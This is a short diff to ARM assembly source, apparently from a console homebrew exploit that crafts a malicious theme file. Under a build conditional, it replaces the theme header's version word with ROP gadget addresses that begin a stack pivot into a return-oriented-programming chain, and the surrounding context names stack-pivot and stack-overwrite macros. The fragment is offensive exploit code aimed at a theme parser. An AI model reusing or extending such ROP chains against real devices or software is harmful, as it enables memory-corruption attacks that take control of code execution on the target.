@@ -493,7 +493,14 @@ ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-piv
 _start:
 
 themeheader:
+#ifndef BUILDROPBIN
 .word 1 @ version
+#else
+.word POP_R0PC @ Stack-pivot to ropstackstart.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0
+#endif
 
 .space ((themeheader + 0xc4) - .)
 
